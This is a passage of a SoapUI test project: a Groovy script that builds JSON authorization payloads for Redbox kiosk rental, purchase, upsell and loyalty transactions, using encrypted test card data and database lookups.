CurrentDate</con:query><con:assertion type="JDBC Status" id="5897a997-f0a8-4714-b2ed-24087b99e9b6" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (GCAuthorize)" id="fcfdeb8e-ec50-48dd-9346-d53e0ee727cf"><con:settings/><con:config><script><![CDATA[//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.
Round2 = new DecimalFormat("#.####"); //Rounding the amount to 2 decimals.
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def epcConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('EPCSvc');
def constring = ConObj.getConnectionString();
def epcconstring = epcConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def epcsql = Sql.newInstance(epcconstring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");
ccPayload = ""
ccPayload += "\"CreditCard\": {";
ccPayload += "\"FirstName\": \"Redbox\",";
ccPayload += "\"LastName\": \"Server\",";
ccPayload += "\"Number\": \"$EncryptedNumber\",";
ccPayload += "\"ExpirationMonth\": \"12\",";
ccPayload += "\"ExpirationYear\": \"20\",";
ccPayload += "\"KeyId\": $KeyID,";
ccPayload += "\"CardId\": \"$CardID\",";
ccPayload += "\"LastFour\": \"$lastFour\",";
ccPayload += "\"CardType\": $CardType,";
ccPayload += "\"Track2\": \"$EncryptedTrack2\"";
ccPayload += "},";
testRunner.testCase.setPropertyValue("CCPayload", ccPayload);

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def uhdPrice = context.expand( '${#TestSuite#4KPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def uhdNonReturnDays = context.expand( '${#TestSuite#4KNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' );

//Service Fee
def enableServiceFee = context.expand( '${#TestCase#EnableServiceFee}');
def serviceFeeTaxRate = context.expand( '${#TestCase#ServiceFeeTaxRate}');
def serviceFeeAmount = context.expand( '${#TestCase#ServiceFeeAmount}');

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def uhdNonreturnPrice = (uhdPrice.toBigDecimal() * uhdNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
//log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");

//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j<getDisctc.getPropertyCount();j++)
{
   getDisctc.getPropertyAt(j).setValue("");
}
//BUILD THE RENTAL and PURCHASE PAYLOAD:
//Grab the barcodes, and product types; build the lists. 
//Rental
allBarcodes = [];
rentalBarcodes = [];
rentalTitleIds = [];
rentalProductFamily = [];
rentalProductType = [];
rentalDiscPrice = [];
rentalNonReturnPrice = [];
rentalNonReturnDays = [];
loyaltyProductId = [];
loyaltyProductPrice = [];
loyaltyPoints = [];
promoProductId = [];
promoProductPrice = [];
nonLoyaltyProductId = [];
nonLoyaltyProductPrice = [];
redemptionPoints = [];
discountedProductId = []; //For Assertions.
discountedProductPrice = []; //For Assertions.
blurayUpsellTypeId = [];
productGroupId = [];
discountAmountList = [];//PROMO List of Amounts for Loyalty and Promo Values 
//MNP
mnpTitleId = [];

//TSP
tspTitleId = [];

//MDV-Rental
rentalMDVFlag = [];
rentalMDVDiscNumber = [];

//Purchase
purchaseBarcodes = [];
purchaseProductFamily = [];
purchaseProductType = [];
purchaseDiscPrice = [];
purchaseTitleIds = [];
itemSourceType = [];

//MDV-Purchase
purchaseMDVFlag = [];
purchaseMDVDiscNumber = [];

//Payload building and Amount Calculations
//Rental Items Payload
rentalPayload = "{\"GroupType\" : 1,  \"Items\" : [";
BigDecimal rentalTotal = 0;
int rentalCount = 0;
//Purchase Items Payload
purchasePayload = "{\"GroupType\" : 2,  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
BigDecimal appliedPromoValue = 0;
int purchaseCount = 0;

//MNP
BigDecimal mnpAmount = 0;

//TSP
BigDecimal tspPromoAmount = 0;

BigDecimal SubTotal = 0;
BigDecimal DiscountedSubTotal = 0;
BigDecimal EstimatedLoyaltyAmount = 0;
BigDecimal TotalCartAmount = 0;//Total of Rental and Purchase Amount
BigDecimal remainingPromoValue = 0;

serviceFeePayload = ""; //ServiceFee Payload
promoPayload = ""; //Promo Code payload
loyaltyPayload = ""; //Loyalty points payload
requestPayload = ""; //Total payload rental + purchase + promo + loyalty

//Creating a Boolean
HasPhysicalPurchase = 'false';
testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);

//Get to-do Rental info
def numAddRentals = Eval.me("[" + context.expand( '${#TestCase#numOfRentals}' ) + "]");
def numAddPurchases = Eval.me("[" + context.expand( '${#TestCase#numOfPurchases}' ) + "]");
def PromoCode = context.expand( '${#TestCase#PromoCode}');
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );
def purchaseFormatIds = context.expand( '${#TestCase#PurchaseFormats}' );
def loyaltyFlag = context.expand( '${#TestCase#LoyaltyFlag}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
def mdvFlag = Eval.me("[" + context.expand( '${#TestCase#MDVFlag}' ) + "]" );
def mdvDiscNumber = Eval.me("[" + context.expand( '${#TestCase#MDVDiscNumber}' )+ "]" );

//MNP
def mnpFlag = context.expand( '${#TestCase#MNPFlag}' );

//TSP
def hasTSP = context.expand( '${#TestCase#HasTSP}' );
def tspFlag = context.expand( '${#TestCase#TSPFlag}' ); 
//Recommended Titles
def RCFlag = Eval.me("[" + context.expand( '${#TestCase#RCFlag}' ) + "]");
def hasOffer = context.expand( '${#TestCase#HasOffer}' )

//MDV
int numberOfmdvFlags = mdvFlag.count {it == 1}; 
//log.info "numberOfmdvFlags: $numberOfmdvFlags | mdvFlag:$mdvFlag";
int numberOfmdvDiscNumber = Eval.me("[" + mdvDiscNumber + "]").count {it == 1}; 
Boolean hasMDV=false
if (numberOfmdvFlags > 0)
{
	hasMDV=true
	testRunner.testCase.setPropertyValue('hasMDV', hasMDV.toString());
}
else
{
	hasMDV=false
	testRunner.testCase.setPropertyValue('hasMDV', hasMDV.toString());
}

//Rental & Purchase Format list
rentalformatIDList = rentalFormatIds.split(",");
purchaseformatIDList = purchaseFormatIds.split(",");

//Loyalty
loyaltyFlagList = loyaltyFlag.split(",");

//MNP
mnpFlagList = mnpFlag.split(",");
//Loyalty
int numberOfLoyaltyFlags = Eval.me("[" + loyaltyFlag + "]").count {it == 1};
//TSP
int numberOfTSPFlags = Eval.me("[" + tspFlag + "]").count {it == 1}; 
//Recommended Titles
int numberOfRCFlags = Eval.me("[" + RCFlag + "]").count {it == 1}; 


//TO-DO STILL THERE IS A FLAW IN THIS LOGIC. NEED TO FIGURE OUT THE SOLUTION.
//Purpose: If datasource says rent Dvd, Bluray and provide quantity for only Dvd and not for Bluray; currently it fail with array out of bound error.
//For Rentals
if (rentalformatIDList.size() != numAddRentals.size())
{
    def difference = (rentalformatIDList.size() - numAddRentals.size())
     for (di = 0; di < difference; di++)
     {
         numAddRentals.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
}
else if (mnpFlagList.size() != numAddRentals.size())
{
     //nothing to do, code looks good
}
/*WRONG PLACE
//MNP
if (mnpFlagList.size() != numAddRentals.size())
{
     def difference = (Integer.valueOf(numAddRentals) - mnpFlagList.size())
     log.info ("difference: $difference")
     for (di = 0; di < difference; di++)
     {
         mnpFlagList.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
     
}
*/
//For Purchases
if (purchaseformatIDList.size() != numAddPurchases.size())
{
    def difference = (purchaseformatIDList.size() - numAddPurchases.size())
     for (di = 0; di < difference; di++)
     {
         numAddPurchases.add('1') //if the size is different add the default to 1
     }
}
else
{
     //nothing to do, code looks good
}
int totalCartCount = 0;
//Get CartSize
if (rentalFormatIds != '' && purchaseFormatIds != '')
{
	log.info ("Has both rental and purchases");
	totalCartCount += (numAddRentals.sum()) + (numAddPurchases.sum())
}
else if (rentalFormatIds == '' && purchaseFormatIds != '')
{
	log.info ("Has purchases");
	totalCartCount +=  (numAddPurchases.sum())
}
else if (rentalFormatIds != '' && purchaseFormatIds == '')
{
	log.info ("Has rental");
	totalCartCount +=  (numAddRentals.sum())
}
else
{
	log.info("I shouldnt be here");
}
//MDV
if (mdvFlag.size() < totalCartCount)
{
	//Set the MDV to 0 
	for (mdv = 0; mdv < totalCartCount; mdv++)
     {
         //if the size is different add the default to 1
         mdvFlag.add('0');
     }
	if (numberOfmdvDiscNumber != totalCartCount)
	{
		for (d = 0; d < totalCartCount; d++)
	     {
	         //if the size is different add the default to 1
	         mdvDiscNumber.add('null');
	     }
	}
}
//Set OfferCode Data
if (hasOffer == 'false')
{
	//Set the RCFlag to 0 so that OfferCode is set to NULL.
	for (rc = 0; rc < totalCartCount; rc++)
     {
         //if the size is different add the default to 1
         RCFlag.add('0');
     }
}
else
{
	//Just to make sure that we have RCFlag for all the discs
	if (RCFlag.size() != totalCartCount)
	{
	    def difference = (totalCartCount - RCFlag.size())
	     for (di = 0; di < difference; di++)
	     {
	         RCFlag.add('0') //if the size is different add the default to 0
	     }
	}
	else
	{
	     //nothing to do, code looks good
	}
}

//Setting the RCFlags
//Saving the flag for Reconcile.
testRunner.testCase.setPropertyValue("RCFlag",RCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));

if (rentalFormatIds != '')
{
	rentalCartCount = numAddRentals.sum()
	rentalRCFlag = RCFlag.take(rentalCartCount)
	remainingRCFlag = RCFlag.drop(rentalCartCount)

	testRunner.testCase.setPropertyValue("rentalRCFlag",rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
	testRunner.testCase.setPropertyValue("purchaseRCFlag",remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
}
else
{
	rentalCartCount = numAddPurchases.sum()
	remainingRCFlag = RCFlag.take(rentalCartCount)
	rentalRCFlag = RCFlag.drop(rentalCartCount)
	
	testRunner.testCase.setPropertyValue("rentalRCFlag",rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
	testRunner.testCase.setPropertyValue("purchaseRCFlag",remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
}

//MDV
mdvFlagList = mdvFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
mdvDiscNumberList = mdvDiscNumber.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//log.info ("mdvFlagList:$mdvFlagList; mdvDiscNumberList:$mdvDiscNumberList");

//Prepare the final list
numAddRentalsList = numAddRentals.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
numAddPurchasesList = numAddPurchases.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

log.info ("numAddRentalsList: $numAddRentalsList; rentalformatIDList: $rentalformatIDList");
log.info ("numAddPurchasesList: $numAddPurchasesList; purchaseformatIDList: $purchaseformatIDList");
if ((rentalFormatIds == '0') || (rentalFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
	testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	testRunner.testCase.setPropertyValue("RentalTaxAmount", '0');
	testRunner.testCase.setPropertyValue("HasPromoDiscount","0");
	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
}
else
{
	//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
	for (r = 0; r < rentalformatIDList.size(); r++)
	{
	    curformatID = rentalformatIDList[r].toString().trim();
	    curmdvFlag = mdvFlagList[r].toString().trim();
	    //log.info ("curformatID: $curformatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    //Skip below formats for MDV since there are no Titles
	    def skipMDV = ["1","2","19"] //DVD,Blu-ray, DigitalCode
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //getDisctc.setPropertyValue('IsMDV',curmdvFlag);  //MDV
	    if (curformatID in skipMDV)
	    {
	    		getDisctc.setPropertyValue('IsMDV','0');
	    }
	    else
	    {
	    		getDisctc.setPropertyValue('IsMDV',curmdvFlag);
	    }
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', '0');    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	
	//Upsell coding logic
	def upsellOffer = context.expand( '${#TestCase#UpsellOffer}' );
	def upsellOfferStatus = context.expand( '${#TestCase#UpsellOfferStatus}' );
	upsellOfferList = upsellOffer.split(",");
	upsellOfferStatusList = upsellOfferStatus.split(",");
	
	//Offer Code	
	offerCodeList = rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	
	//Will Grab one format a time to build the request.	
	for (f = 0; f < rentalformatIDList.size(); f++)
	{
	    def HasUpsell = context.expand( '${#TestCase#HasUpsell}' );
	    if (HasUpsell == 'true')
	    {
	    	//Upsell Logic
		curUpsellOffer = upsellOfferList[f].toString().trim();
		curUpsellOfferStatus = upsellOfferStatusList[f].toString().trim();
	    }
	    else
	    {
	    	curUpsellOffer = '0' 
	    }
	    
	    curformatID = rentalformatIDList[f].toString().trim(); 	    
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    //log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numAddRentalsList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	

	    //Create a payload for rental items; barcodes are grabed from the GetDiscs testcase property. 
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        curOfferCode = offerCodeList[b].toString().trim();

	        //MDV
		   curmdvFlag = mdvFlagList[b].toString().trim();
		   curmdvDiscNumber = mdvDiscNumberList[b].toString().trim();
		   
       	   //curmnpFlag = mnpFlagList[b].toString().trim();
	        rentalPayload += "{"
	        rentalPayload += "\"ProductId\" : $curTitleID,"
	        rentalPayload += "\"Barcode\" : \"$curBarcodeID\","
	        rentalPayload += "\"VendStatus\" : 28," //To-DO
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
	       
	        def skipFormats = ["DVD","Blu-ray","DigitalCode"]
	        //MDV
	        if (FormatName in skipFormats)
	        {
	        	rentalPayload += "\"MultiDisc\" : false,"
	        	rentalPayload += "\"DiscNumber\" : null,"
			
			rentalMDVFlag.add('false');
			rentalMDVDiscNumber.add('null');	        	
	        }
	        else
	        {
			rentalPayload += "\"MultiDisc\" : true,"
	        	rentalPayload += "\"DiscNumber\" : $curmdvDiscNumber,"

			rentalMDVFlag.add('true');
			rentalMDVDiscNumber.add(curmdvDiscNumber);
	        }
	        //EARLY-ID / OfferCode
	        if (curOfferCode == '1')
	        {
	        	rentalPayload += "\"OfferCode\" : \"RC\","
	        }
	        else
	        {
	        	rentalPayload += "\"OfferCode\" : null,"
	        }
	        rentalPayload += "\"Pricing\" : {"
	        if (curformatID == '1') //For DVD
	        {
			rentalPayload += "\"InitialNight\" : $dvdPrice,"
			rentalPayload += "\"ExtraNight\" : $dvdPrice,"
			rentalPayload += "\"NonReturn\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $dvdPrice,"
			rentalPayload += "\"NonReturnDays\" : $dvdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 0,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $dvdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $dvdPrice"

			//For Upsell 
			upsellTypeId = 1;
		    //Calculate Rental Total
			rentalTotal += (dvdPrice.toBigDecimal());
			rentalDiscPrice.add(dvdPrice);
			rentalNonReturnPrice.add(dvdNonreturnPrice);
			rentalNonReturnDays.add(dvdNonReturnDays);
			redemptionPoints.add('1500');
	        }
	        else if (curformatID == '2') //For Bluray
	        {
			rentalPayload += "\"InitialNight\" : $blurayPrice,"
			rentalPayload += "\"ExtraNight\" : $blurayPrice,"
			rentalPayload += "\"NonReturn\" : $blurayNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $blurayPrice,"
			rentalPayload += "\"NonReturnDays\" : $blurayNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $blurayPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $blurayPrice"
			
			//For Upsell 
			upsellTypeId = 1;
			//Calculate Rental Total
			rentalTotal += (blurayPrice.toBigDecimal());
			rentalDiscPrice.add(blurayPrice);
			rentalNonReturnPrice.add(blurayNonreturnPrice); 
			rentalNonReturnDays.add(blurayNonReturnDays);
			redemptionPoints.add('1750')
	        }
	        else if (curformatID == '19') //For 4K
	        {
			rentalPayload += "\"InitialNight\" : $uhdPrice,"
			rentalPayload += "\"ExtraNight\" : $uhdPrice,"
			rentalPayload += "\"NonReturn\" : $uhdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $uhdPrice,"
			rentalPayload += "\"NonReturnDays\" : $uhdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $uhdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $uhdPrice"
			
			//For Upsell 
			upsellTypeId = 3;
			//Calculate Rental Total
			rentalTotal += (uhdPrice.toBigDecimal());
			rentalDiscPrice.add(uhdPrice);
			rentalNonReturnPrice.add(uhdNonreturnPrice); 
			rentalNonReturnDays.add(uhdNonReturnDays);
			redemptionPoints.add('2000')
	        }
	        else //For Games
	        {
	        	if (curmdvFlag == '1' && curmdvDiscNumber != '1')
			{
				updatedGameprice = '0';
				updatedgameNonreturnPrice = '0'
			}
			else
			{
				updatedGameprice = gamePrice;
				updatedgameNonreturnPrice = gameNonreturnPrice;
			}
			rentalPayload += "\"InitialNight\" : $gamePrice,"
			rentalPayload += "\"ExtraNight\" : $gamePrice,"
			rentalPayload += "\"NonReturn\" : $gameNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $gamePrice,"
			rentalPayload += "\"NonReturnDays\" : $gameNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $gamePrice,"
			rentalPayload += "\"DefaultExtraNight\" : $gamePrice"
			
			//For Upsell 
			upsellTypeId = 1;
			//Calculate Rental Total
			rentalTotal += (updatedGameprice.toBigDecimal());
			rentalDiscPrice.add(updatedGameprice);
			rentalNonReturnPrice.add(updatedgameNonreturnPrice);
			rentalNonReturnDays.add(gameNonReturnDays);
			redemptionPoints.add('2500');
	        }
	        //rentalPayload += ",\"SourceType\" : 1"  --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
			rentalPayload += "}," 
			if (curUpsellOffer == '1')
			{
				//def getProductGroupInfo = epcsql.firstRow("Select ProductGroupId from ProductGroupXREF Where ProductId = $curTitleID");
				def getProductGroupInfo = epcsql.firstRow("Select ProductGroupId from ProductGroupXREF Where ProductId in (Select ProductId from Product Where ProductNumber =$curTitleID)");
				def curproductGroupId = getProductGroupInfo.ProductGroupId.toString();
				rentalPayload += "\"BlurayUpsell\" : {"
				rentalPayload += "\"ProductGroupId\" : $curproductGroupId,"
				rentalPayload += "\"Offer\" : \"$curUpsellOfferStatus\","
				rentalPayload += "\"TitleId\" : $curTitleID,"
				rentalPayload += "\"TypeId\" : $upsellTypeId"
				rentalPayload += "},"
				productGroupId.add(curproductGroupId);
			}
			else
			{
				rentalPayload += "\"BlurayUpsell\" : null,"
				productGroupId.add(0)
			}
			rentalPayload += "\"ItemSourceType\" : 3"
			rentalPayload += "}" 
			 
			//Prepare it as List.
			rentalTitleIds.add(curTitleID);
			rentalBarcodes.add(curBarcodeID);
			allBarcodes.add(curBarcodeID);
			testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString()); 
			rentalProductFamily.add(formatTypeName);
			rentalProductType.add(FormatName);
			blurayUpsellTypeId.add(upsellTypeId);
			itemSourceType.add(0);
			rentalCount += 1;
			
			if (b+1 < numOfBarcodes.toInteger())
			{
			  rentalPayload += ","
			} 
	    }	    
	    if (f+1 < rentalformatIDList.size())
	    {
	        rentalPayload += ","
	    }  
	    //testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
    	    testRunner.testCase.setPropertyValue('RentalTitleIds', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	    testRunner.testCase.setPropertyValue('RentalDiscPrice', rentalDiscPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnPrice', rentalNonReturnPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnDays', rentalNonReturnDays.join(",").toString());
	    testRunner.testCase.setPropertyValue('RedemptionPoints', redemptionPoints.join(",").toString());
	    testRunner.testCase.setPropertyValue('UpsellTypeId', blurayUpsellTypeId.join(",").toString()); 
	    testRunner.testCase.setPropertyValue('ProductGroupId', productGroupId.join(",").toString()); 
	    testRunner.testCase.setPropertyValue('ItemSourceType', itemSourceType.join(",").toString())
	    //MDV
	    testRunner.testCase.setPropertyValue('RentalMDVFlag', rentalMDVFlag.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalMDVDiscNumber', rentalMDVDiscNumber.join(",").toString());
	}
	log.info ("rentalTitleIds: $rentalTitleIds; rentalDiscPrice:$rentalDiscPrice; redemptionPoints:$redemptionPoints");
	testRunner.testCase.setPropertyValue("DiscountTitleIds",rentalTitleIds.join(",").toString())
	testRunner.testCase.setPropertyValue("DiscountProductPrices",rentalDiscPrice.join(",").toString())

//Build loyalty payload.
	if (loyaltyFlag == "")
	{
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",rentalTitleIds.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",rentalDiscPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
	}
	else
	{
		loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		loyaltyTitlePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		for (l = 0; l < numberOfLoyaltyFlags; l++)
		{
		    	def DiscountTitleIds = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]");
		    	def DiscountProductPrices = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]");
		    	def redemptionPointsList = Eval.me("[" + context.expand( '${#TestCase#RedemptionPoints}' ) + "]");
		    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
		    	curLoyaltyTitle = DiscountTitleIds.take(1).toString().replace("[", "").replace("]", "");
			curLoyaltyPrice = DiscountProductPrices.take(1).toString().replace("[", "").replace("]", "");
			curredemptionPoints = redemptionPointsList.take(1).toString().replace("[", "").replace("]", "");
		    	//log.info ("curLoyaltyFlag:$curLoyaltyFlag; curLoyaltyTitle:$curLoyaltyTitle; curLoyaltyPrice:$curLoyaltyPrice; curredemptionPoints:$curredemptionPoints");
		    	if (curLoyaltyFlag == '1')
		    	{
		    	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","1");
		    	loyaltyPayload += "{"; 
			loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
			loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
			loyaltyPayload += "\"PromotionCode\": null,";
			//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
			loyaltyPayload += "\"RedemptionPoints\": $curredemptionPoints,";
			loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
			loyaltyPayload += "}"; 
			//Calculate Loyalty Total
			EstimatedLoyaltyAmount += (curLoyaltyPrice.toBigDecimal());
			loyaltyProductId.add(curLoyaltyTitle);
		    	loyaltyProductPrice.add(curLoyaltyPrice);
		    	loyaltyPoints.add(curredemptionPoints);
		    	discountAmountList.add(curLoyaltyPrice); //PROMO
		    	//For Assertions grabbing all the Discounted Titles and Prices.
		    	discountedProductId.add(curLoyaltyTitle);
		    	discountedProductPrice.add(curLoyaltyPrice);
		    	}
		    	else if (curLoyaltyFlag == "0")
		    	{
		    		//testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
		    		nonLoyaltyProductId.add(curLoyaltyTitle);
		    		nonLoyaltyProductPrice.add(curLoyaltyPrice);
		    		//log.info ("Flag is 0");
		    	}
		    	//remainingTitles = DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", "");
		    	testRunner.testCase.setPropertyValue("DiscountTitleIds",DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", ""))
		    	testRunner.testCase.setPropertyValue("DiscountProductPrices",DiscountProductPrices.drop(1).toString().replace("[", "").replace("]", ""));
		    	testRunner.testCase.setPropertyValue("RedemptionPoints",redemptionPointsList.drop(1).toString().replace("[", "").replace("]", ""))		    	
		    	if (l+1 < numberOfLoyaltyFlags)
		      {
		      		if (curLoyaltyFlag == '1')
		      		{
		      			loyaltyPayload += ","
		      		}
		      		else
		      		{
		      			//None as of Now		      			
		      		}		      		     	
		      }
		      log.info ("loyaltyPayload: $loyaltyPayload");
		} 
		testRunner.testCase.setPropertyValue("LoyaltyProductPrice",loyaltyProductPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("LoyaltyProductId",loyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",nonLoyaltyProductId.join(",").toString());
